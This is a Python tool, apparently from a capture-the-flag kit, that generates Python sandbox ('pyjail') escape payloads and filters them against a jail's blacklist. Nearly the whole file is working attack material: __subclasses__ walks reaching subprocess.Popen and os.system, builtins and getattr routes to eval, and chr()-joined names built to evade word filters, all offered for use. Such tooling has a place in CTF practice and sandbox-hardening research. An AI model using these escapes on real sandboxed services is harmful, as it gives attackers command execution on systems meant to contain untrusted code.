#!/usr/bin/env python3
"""pyjail_gen.py — pyjail payload candidates filtered by the jail's blacklist.

misc-interpreter-escape's rule: first learn whether the check is a string
blacklist, a parsed-AST rule, or a sandbox — then pick the shape that
avoids it. This tool handles the mechanical part for the common case
(string blacklist on words or characters): a corpus of escape shapes
(dunder walks, getattr/indirection, builtins dict, chr-join forms) is
filtered against the banned strings and chars you observed, and only
survivors are emitted — each with a note on what it does and which index
still has to be enumerated at run time (the skill's own warning:
__subclasses__ walks are index-fragile).

    python3 tools/pyjail_gen.py --banned eval exec import os
    python3 tools/pyjail_gen.py --banchars "()'" --banned system
    python3 tools/pyjail_gen.py --selftest
"""
from __future__ import annotations

import argparse
import json
import sys

# corpus: (name, payload template, what it does, what must still be found)
_CORPUS = [
    ("subclasses-walk",
     "().__class__.__base__.__subclasses__()",
     "enumerate the class tree; index N found at run time",
     "index of an importable/os class"),
    ("subclasses-popen",
     "().__class__.__base__.__subclasses__()[N]('id',shell=True)",
     "subprocess.Popen once the index N is enumerated",
     "index of Popen in the walk"),
    ("wrapclose-globals",
     "().__class__.__base__.__subclasses__()[N].__init__.__globals__['system']('id')",
     "os._wrap_close.__init__.__globals__ exposes os.system",
     "index of _wrap_close in the walk"),
    ("getattr-attr",
     'getattr((), "__class__")',
     "name built as a string dodges a name blacklist on dunders",
     "none — then chain getattr for each step"),
    ("builtins-dict",
     "__builtins__['eval']('EXPR')",
     "builtins dict subscript reaches eval without the word 'import'",
     "EXPR to run"),
    ("builtins-getattr",
     "getattr(__builtins__, 'eval')('EXPR')",
     "getattr indirection on builtins",
     "EXPR to run"),
    ("globals-walk",
     "().__class__.__init__.__globals__['__builtins__']['eval']('EXPR')",
     "init globals -> builtins -> eval",
     "EXPR to run"),
    ("help-breakpoint",
     "help()",
     "interactive help viewer can leak modules; 'os' then !cmd in some jails",
     "interactive channel only"),
]


def _chrjoin(s):
    return '"".join(map(chr,[' + ",".join(str(ord(c)) for c in s) + ']))'


def _chr_form(attr):
    return (f'getattr((), {_chrjoin("__class__")}).'
            f'__mro__[1].__subclasses__()')


def _violates(payload, banned_words, banned_chars):
    hits = [w for w in banned_words if w and w in payload]
    hits += [c for c in banned_chars if c and c in payload]
    return hits


def gen(args) -> dict:
    bw = args.get("banned") or []
    bc = list(args.get("banchars") or "")
    out = {"banned_words": bw, "banned_chars": bc, "payloads": []}
    expr = args.get("expr", "print(1)")
    for name, tpl, does, needs in _CORPUS:
        p = tpl.replace("EXPR", expr)
        hits = _violates(p, bw, bc)
        if hits:
            out["payloads"].append({"name": name, "payload": p,
                                    "rejected": hits})
            continue
        out["payloads"].append({"name": name, "payload": p,
                                "does": does, "still_needs": needs})
    # chr-join survives any WORD blacklist (names never appear literally)
    for attr in bw:
        if attr.isidentifier() or (attr.startswith("__") and attr.endswith("__")):
            p = (f"getattr((), {_chrjoin(attr)})")
            out["payloads"].append({"name": f"chrjoin-{attr}", "payload": p,
                                    "does": f"rebuilds the string '{attr}' "
                                            "via chr() — invisible to a word "
                                            "blacklist"})
    ok = [p for p in out["payloads"] if "rejected" not in p]
    out["usable"] = len(ok)
    return out


def _selftest() -> int:
    out = gen({"banned": ["eval", "import"], "banchars": "", "expr": "print(1)"})
    names = {p["name"] for p in out["payloads"]}
    assert "subclasses-walk" in names
    rej = {p["name"] for p in out["payloads"] if "rejected" in p}
    assert "builtins-dict" in rej, rej  # contains 'eval'
    keep = {p["name"] for p in out["payloads"] if "rejected" not in p}
    assert "chrjoin-eval" in keep, keep
    out2 = gen({"banned": [], "banchars": "()'", "expr": "print(1)"})
    # with ( ) ' banned almost everything is rejected — honest
    assert out2["usable"] <= 1, out2
    print("pyjail_gen selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--banned", nargs="*", help="blacklisted words")
    ap.add_argument("--banchars", help="blacklisted characters")
    ap.add_argument("--expr", default="print(1)",
                    help="expression the eval-shaped payloads should run")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    print(json.dumps(gen(vars(args)), indent=1))
    return 0


if __name__ == "__main__":
    sys.exit(main())
